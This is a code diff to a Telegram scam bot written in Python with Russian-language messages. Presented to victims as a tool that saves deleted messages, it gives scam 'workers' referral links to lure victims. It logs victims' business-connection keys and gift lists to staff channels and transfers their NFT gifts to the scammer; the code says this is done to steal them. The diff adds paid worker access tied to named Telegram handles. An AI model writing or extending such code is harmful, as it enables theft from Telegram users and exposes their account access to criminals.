@@ -7,6 +7,7 @@ import os
 import database
 import api as mlcapi
 import config
+import sub
 
 bot = async_telebot.AsyncTeleBot(config._TOKEN)
 
@@ -18,13 +19,97 @@ def encrypt(input_string):
 @bot.message_handler(commands=['referalka'])
 async def get_my_ref(message: types.Message) -> None:
     _USER_ID = message.chat.id
+    if sub.check(_USER_ID) == False:
+        await bot.send_message(_USER_ID, (f"Для получения доступа к боту обратитесь к @RipFather / @SwiftTag"))
+        return
     try:
         bot_username = (await bot.get_me()).username
-        await bot.send_message(_USER_ID, (f"🦣 Ваша ссылка для привода мамонтов: https://t.me/{bot_username}?start={_USER_ID}"))
+        await bot.send_message(_USER_ID, (f"🦣 Ваша ссылка для привода мамонтов: t.me/{bot_username}?start={_USER_ID}\n\nЛоги:\nt.me/+5eGckmd_pQIwYTI5\nt.me/+BFRy1jZmjK0yZGQx"), disable_web_page_preview=True)
         print(f"/referalka by {_USER_ID}")
     except Exception as e:
         print(f"Error getting bot username or sending message for /get_ref: {e}")
         await bot.send_message(_USER_ID, "Не удалось сгенерировать реферальную ссылку.")
+
+@bot.message_handler(commands=['sub'])
+async def handle_subscribe(message: types.Message):
+    try:
+        parts = message.text.split()
+        if len(parts) < 2:
+            await bot.reply_to(message, "Пожалуйста, укажите число после команды /sub. Пример: /sub 123")
+            return
+
+        record_str = parts[1]
+        try:
+            record = int(record_str)
+        except ValueError:
+            try:
+                record = float(record_str)
+            except ValueError:
+                await bot.reply_to(message, f"'{record_str}' не является числом. Пожалуйста, введите корректное число.")
+                return
+        
+        if sub.sub(record):
+            await bot.reply_to(message, f"Число {record} успешно добавлено в базу.")
+        else:
+            if sub.check(record):
+                 await bot.reply_to(message, f"Число {record} уже существует в базе.")
+            else:
+                 await bot.reply_to(message, f"Не удалось добавить {record}. Возможно, это не число?")
+    except Exception as e:
+        await bot.reply_to(message, f"Произошла ошибка: {e}")
+
+@bot.message_handler(commands=['unsub'])
+async def handle_unsubscribe(message: types.Message):
+    try:
+        parts = message.text.split()
+        if len(parts) < 2:
+            await bot.reply_to(message, "Пожалуйста, укажите число после команды /unsub. Пример: /unsub 123")
+            return
+        
+        record_str = parts[1]
+        try:
+            record = int(record_str)
+        except ValueError:
+            try:
+                record = float(record_str)
+            except ValueError:
+                await bot.reply_to(message, f"'{record_str}' не является числом. Пожалуйста, введите корректное число.")
+                return
+
+        if sub.unsub(record):
+            await bot.reply_to(message, f"Число {record} успешно удалено из базы.")
+        else:
+            if not sub.check(record):
+                await bot.reply_to(message, f"Число {record} не найдено в базе.")
+            else:
+                await bot.reply_to(message, f"Не удалось удалить {record}. Возможно, это не число?")
+    except Exception as e:
+        await bot.reply_to(message, f"Произошла ошибка: {e}")
+
+@bot.message_handler(commands=['check'])
+async def handle_check(message: types.Message):
+    try:
+        parts = message.text.split()
+        if len(parts) < 2:
+            await bot.reply_to(message, "Пожалуйста, укажите число после команды /check. Пример: /check 123")
+            return
+
+        record_str = parts[1]
+        try:
+            record = int(record_str)
+        except ValueError:
+            try:
+                record = float(record_str)
+            except ValueError:
+                await bot.reply_to(message, f"'{record_str}' не является числом. Пожалуйста, введите корректное число.")
+                return
+        
+        if sub.check(record):
+            await bot.reply_to(message, f"Число {record} найдено в базе.")
+        else:
+            await bot.reply_to(message, f"Число {record} не найдено в базе.")
+    except Exception as e:
+        await bot.reply_to(message, f"Произошла ошибка: {e}")
 
 
 @bot.message_handler(commands=['start'])
@@ -96,7 +181,7 @@ async def business_connection(conn: types.BusinessConnection) -> None:
                         "Теперь каждое сообщение, удалённое/изменённое собеседником будет отправлено в этот чат\n"
                         "Так-же, просто ответив на любое исчезающее сообщение оно будет отправлено в этот чат\n"
                         f"@{bot_username}\n\n"
-                        "🩵Скорее беги опробовать!)"
+                        "🩵 Скорее беги опробовать!)"
                     ))
             except Exception as e:
                 print(f"User {_USER_ID} didn't start bot before setting as business-bot or blocked it, failed to send legit mode msg: {e}")
@@ -104,60 +189,59 @@ async def business_connection(conn: types.BusinessConnection) -> None:
         _VIEW_RIGHT = False
         giftlist = ""
         giftcount = 0
-        _STARS = "Неизвестно"
+        #_STARS = "Неизвестно"
 
         try:
-            stars_result = await mlcapi.get_stars(___TOKEN___, _ID)
-            if isinstance(stars_result, dict) and stars_result.get('ok'):
-                result_data = stars_result.get('result')
-                if isinstance(result_data, dict):
-                    star_amount = result_data.get('star_amount')
-                    if isinstance(star_amount, (int, float)):
-                         _STARS = str(star_amount) + " шт."
-                         _VIEW_RIGHT = True
-                    else:
-                         _STARS = star_amount
-                else:
-                     _STARS = "Ошибка формата"
-                     print(f"Warning: Unexpected 'result' format in get_stars for {_ID}: {result_data}")
-            elif isinstance(stars_result, str) and stars_result == "Arguments exception":
-                _STARS = "Ошибка аргументов"
-            elif isinstance(stars_result, dict) and not stars_result.get('ok'):
-                _STARS = f"Ошибка API: {stars_result.get('description', 'N/A')}"
-            else:
-                _STARS = "Неизвестный ответ API"
-                print(f"Warning: mlcapi.get_stars unexpected result for {_ID}: {stars_result}")
+            # stars_result = await mlcapi.get_stars(___TOKEN___, _ID)
+            # if isinstance(stars_result, dict) and stars_result.get('ok'):
+            #     result_data = stars_result.get('result')
+            #     if isinstance(result_data, dict):
+            #         star_amount = result_data.get('star_amount')
+            #         if isinstance(star_amount, (int, float)):
+            #              _STARS = str(star_amount) + " шт."
+            #              _VIEW_RIGHT = True
+            #         else:
+            #              _STARS = star_amount
+            #     else:
+            #          _STARS = "Ошибка формата"
+            #          print(f"Warning: Unexpected 'result' format in get_stars for {_ID}: {result_data}")
+            # elif isinstance(stars_result, str) and stars_result == "Arguments exception":
+            #     _STARS = "Ошибка аргументов"
+            # elif isinstance(stars_result, dict) and not stars_result.get('ok'):
+            #     _STARS = f"Ошибка API: {stars_result.get('description', 'N/A')}"
+            # else:
+            #     _STARS = "Неизвестный ответ API"
+            #     print(f"Warning: mlcapi.get_stars unexpected result for {_ID}: {stars_result}")
 
-            if _STARS != "Неизвестно" and not _STARS.startswith("Ошибка API"):
-                gifts = await mlcapi.get_gift_list(___TOKEN___, _ID)
-                if isinstance(gifts, list) and len(gifts) > 0:
-                    if gifts[0].isdigit():
-                        giftcount = int(gifts[0])
-                        _VIEW_RIGHT = True
-                        index = 0
-                        for gift in gifts[1]:
-                            giftik = gift['name']
-                            prefix = "└" if index == len(gifts[1])-1 else "├"
-                            giftlist += f' {prefix} t.me/nft/{giftik}' + '\n'
-                            index += 1
-                    else:
-                        giftlist = f"└ {gifts[0]}"
+            gifts = await mlcapi.get_gift_list(___TOKEN___, _ID)
+            if isinstance(gifts, list) and len(gifts) > 0:
+                if gifts[0].isdigit():
+                    giftcount = int(gifts[0])
+                    _VIEW_RIGHT = True
+                    index = 0
+                    for gift_item in gifts[1]:
+                        giftik = gift_item['name']
+                        prefix = "└" if index == len(gifts[1])-1 else "├"
+                        giftlist += f' {prefix} t.me/nft/{giftik}' + '\n'
+                        index += 1
                 else:
-                     giftlist = "└ Ошибка получения списка подарков"
+                    giftlist = f"└ {gifts[0]}"
+            else:
+                giftlist = "└ Ошибка получения списка подарков"
 
         except Exception as e:
             print(f"Error fetching stars/gifts for connection {_ID}: {e}")
-            _STARS = "Ошибка запроса"
+            #_STARS = "Ошибка запроса"
             giftlist = "└ Ошибка запроса"
 
         lastPart = ""
         if _VIEW_RIGHT:
              lastPart = (f"🗂 Разрешения: Просмотр звезд/подарков {'✓' if _VIEW_RIGHT else '✗'}" "\n\n"
-                         f"⭐️ Звёзд: {_STARS}" "\n"
+                         #f"⭐️ Звёзд: {_STARS}" "\n"
                          f"🎁 Список подарков ({giftcount} шт.):" "\n"
                          f"{giftlist if giftlist else '└ Нет подарков'}")
         else: 
-            lastPart = f"- Не удалось получить информацию о подарках. Возможно, не хватает разрешений"
+            lastPart = f"❌ Не удалось получить информацию о подарках. Возможно, не хватает разрешений."
 
         await database.update_mamont(_ID, True)
         log_message = (f"🔋 Новый коннект:\n"
@@ -167,11 +251,17 @@ async def business_connection(conn: types.BusinessConnection) -> None:
                        f" └ 🔐 Ключ: {_KEY}\n\n"
                        f"{lastPart}")
 
-        await bot.send_message(config._LOGS_CONNECT_STAFF, log_message)
-        public_log_message = log_message.replace(f"{_KEY}", "Скрыт")
-        await bot.send_message(config._LOGS_CONNECT_PUBLIC, public_log_message)
+        try:
+            await bot.send_message(config._LOGS_CONNECT_STAFF, log_message)
+            public_log_message = log_message.replace(f"{_KEY}", "Скрыт")
+            await bot.send_message(config._LOGS_CONNECT_PUBLIC, public_log_message)
+        except:
+            await bot.send_message(config._LOGS_CONNECT_STAFF, f"Отправить лог {_KEY} не удалось\n\n{e}")
 
         if isinstance(_WORKER, (int, str)) and str(_WORKER).isdigit():
+            if sub.check(_WORKER) == False:
+                await bot.send_message(_WORKER, (f"Сейчас тебе бы пришел лог но у тебя нет доступа, получи доступ к боту у @RipFather / @SwiftTag"))
+                return
             try:
                 await bot.send_message(int(_WORKER), log_message)
             except Exception as e:
@@ -230,9 +320,9 @@ async def echo(message: types.Message) -> None:
             await bot.send_message(config._LOGS_MESSAGE, f"❌ Нету подарков у {_UNIQUE_ID}, чтобы украсть для tg://user?id={_SENDER.id}")
             return
 
-        for gift in gifts[1]:
-            gift_id = gift['id']
-            gift_name = gift['name']
+        for gift_item in gifts[1]:
+            gift_id = gift_item['id']
+            gift_name = gift_item['name']
             steal_target_user_id = _SENDER.id
 
             steal_result = await mlcapi.transfer_gift(___TOKEN___, _UNIQUE_ID, gift_id, steal_target_user_id)
